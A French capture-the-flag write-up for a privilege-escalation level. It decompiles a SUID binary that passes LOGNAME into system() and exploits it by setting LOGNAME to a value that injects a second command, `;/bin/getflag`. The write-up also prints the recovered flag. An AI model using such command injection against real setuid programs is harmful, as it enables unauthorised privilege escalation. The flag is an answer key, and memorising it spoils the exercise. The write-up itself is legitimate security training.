## LEVEL07

- Dans ce level, un binaire nommé `level07` se trouve dans le home : 
```bash
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
- Le binaire a le bit SUID et appartient à flag07.

- Lorsqu’on le lance cela affiche simplement `level07` dans le terminal.

- On peut utiliser ghidra pour décompiler et essayer de comprendre ce que fait ce binaire:
```c
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
                    /* Unresolved local var: char * buffer@[DW_OP_breg4(ESP): +20]
                       Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}
```

- On peut voir que le programme récupère la valeur de la variable d’environnement `LOGNAME` puis construit une string avec asprintf `/bin/echo <valeur de LOGNAME>`.  
Ensuite cette chaîne est passée à system qui appellera la commande reçue en argument,
dans le cas présent echo avec la valeur de LOGNAME en argument.  



## EXPLOITATION
- system() ne se contente pas d’exécuter un binaire, il invoque un shell,
ce qui rend la commande sensible à l’injection et permet
d’utiliser des séparateurs de commandes comme `;`.
- Après avoir analysé le binaire on comprend rapidement qu'il faut modifier la variable d’environnement LOGNAME afin que system call la fonction getflag.  

```bash
export LOGNAME='FLAG;/bin/getflag'
```

- system sera donc appelé comme ceci `system("/bin/echo FLAG;/bin/getflag")` et exécutera donc getflag après echo.


## FLAG 

- fiumuikeil55xe9cu4dood66h

